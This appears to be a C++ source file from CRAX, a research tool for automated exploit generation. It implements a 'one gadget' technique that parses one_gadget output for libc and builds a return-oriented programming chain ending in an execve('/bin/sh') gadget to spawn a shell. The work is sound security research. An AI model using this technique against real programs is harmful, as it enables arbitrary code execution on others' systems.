// Copyright 2021-2022 Software Quality Laboratory, NYCU.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include <s2e/Plugins/CRAX/CRAX.h>
#include <s2e/Plugins/CRAX/Expr/Expr.h>
#include <s2e/Plugins/CRAX/Utils/StringUtil.h>
#include <s2e/Plugins/CRAX/Utils/Subprocess.h>

#include <cassert>
#include <utility>

#include "OneGadget.h"

using namespace klee;

namespace s2e::plugins::crax {

OneGadget::OneGadget() : Technique(), m_oneGadget() {
    const Exploit &exploit = g_crax->getExploit();
    const ELF &libc = exploit.getLibc();
    bool canSatisfyAllConstraints = true;

    for (auto libcOneGadget : parseOneGadget()) {
        for (const auto &gadget : libcOneGadget.gadgets) {
            log<INFO>() << "Checking OneGadget constraint: " << gadget.first << '\n';
            if (!exploit.resolveGadget(libc, gadget.first)) {
                canSatisfyAllConstraints = false;
                break;
            }
        }

        if (canSatisfyAllConstraints) {
            m_oneGadget = std::move(libcOneGadget);
            break;
        }
    }

    assert(m_oneGadget.offset && "OneGadget technique is not viable.");

    for (const auto &gadget : m_oneGadget.gadgets) {
        m_requiredGadgets.push_back(std::make_pair(&libc, gadget.first));
    }
}


void OneGadget::initialize() {
    resolveRequiredGadgets();
}

bool OneGadget::checkRequirements() const {
    return Technique::checkRequirements();
}

std::vector<RopSubchain> OneGadget::getRopSubchains() const {
    Exploit &exploit = g_crax->getExploit();
    ELF &libc = exploit.getLibc();

    RopSubchain rop;
    rop.push_back(ConstantExpr::create(0, Expr::Int64));  // RBP

    // Set all the required registers to the desired value.
    for (const auto &gadget : m_oneGadget.gadgets) {
        rop.push_back(BaseOffsetExpr::create(exploit, libc, Exploit::toVarName(gadget.first)));
        rop.push_back(gadget.second);
    }

    // Return to the gadget, spawning a shell.
    rop.push_back(BaseOffsetExpr::create(libc, m_oneGadget.offset));
    return { rop };
}

RopSubchain OneGadget::getExtraRopSubchain() const {
    return {};
}


std::vector<OneGadget::LibcOneGadget> OneGadget::parseOneGadget() const {
    const Exploit &exploit = g_crax->getExploit();
    const ELF &libc = exploit.getLibc();

    // Get the output of `one_gadget <libc_path>`
    // and store it in `output`.
    subprocess::popen oneGadget("one_gadget", { libc.getFilename() });
    std::string output = streamToString(oneGadget.stdout());

    // Example output (after being splitted by '\n')
    // 0xe6c7e execve("/bin/sh", r15, r12)
    // constraints:
    //   [r15] == NULL || r15 == NULL
    //   [r12] == NULL || r12 == NULL
    // 0xe6c81 execve("/bin/sh", r15, rdx)
    // constraints:
    //   [r15] == NULL || r15 == NULL
    //   [rdx] == NULL || rdx == NULL
    // 0xe6c84 execve("/bin/sh", rsi, rdx)
    // constraints:
    //   [rsi] == NULL || rsi == NULL
    //   [rdx] == NULL || rdx == NULL
    assert(startsWith(output, "0x") && "An error occurred while running one_gadget");
    std::vector<LibcOneGadget> ret;

    LibcOneGadget current;
    std::string gadgetAsm;

    for (auto line : split(output, '\n')) {
        if (startsWith(line, "0x")) {
            if (current.offset) {
                ret.push_back(std::move(current));
            }

            std::vector<std::string> tokens = split(line, ' ');
            current.offset = std::stoull(tokens[0], nullptr, 16);

        } else if (!startsWith(line, "constraints:")) {
            // Parse the line.
            for (const auto &constraintStr : split(strip(line), " || ")) {
                GadgetValuePair gadget = parseConstraint(constraintStr);

                if (gadget.first.size()) {
                    current.gadgets.push_back(std::move(gadget));
                    break;
                }
            }
        }
    }

    ret.push_back(std::move(current));
    return ret;
}

OneGadget::GadgetValuePair OneGadget::parseConstraint(const std::string &constraintStr) const {
    static const std::regex reg1("^[a-z0-9]* == NULL$");
    static const std::regex reg2("^[[a-z0-9]*] == NULL$");
    static const std::regex reg3("^[[a-z0-9]*\\+0[xX][a-f0-9]+] == NULL$");
    static const std::regex reg4("^[a-z0-9]* is the GOT address of libc");

    const Exploit &exploit = g_crax->getExploit();
    const ELF &elf = exploit.getElf();

    GadgetValuePair ret;
    std::smatch match;

    if (std::regex_match(constraintStr, match, reg1)) {
        // e.g., x == NULL
        // Set the register x to 0.
        std::string reg = constraintStr.substr(0, constraintStr.find(' '));
        ret.first = format("pop %s ; ret", reg.c_str());
        ret.second = ConstantExpr::create(0, Expr::Int64);

    } else if (std::regex_match(constraintStr, match, reg2)) {
        // e.g., [x] == NULL
        // Set the register x to some value where [x] == 0.
        std::string reg = constraintStr.substr(1, constraintStr.find(']') - 1);
        uint64_t offset = elf.checksec.hasPIE ? 8 : 0x400008;
        ret.first = format("pop %s ; ret", reg.c_str());
        ret.second = BaseOffsetExpr::create(elf, offset);

    } else if (std::regex_match(constraintStr, match, reg3)) {
        // e.g., [x+0x40] == NULL
        // XXX: Implement this

    } else if (std::regex_match(constraintStr, match, reg4)) {
        // e.g., x is the GOT address of libc
        // XXX: Implement this
    }

    //log<WARN>() << "[OneGadget] unhandled constraint: " << constraintStr << '\n';
    return ret;
}

}  // namespace s2e::plugins::crax
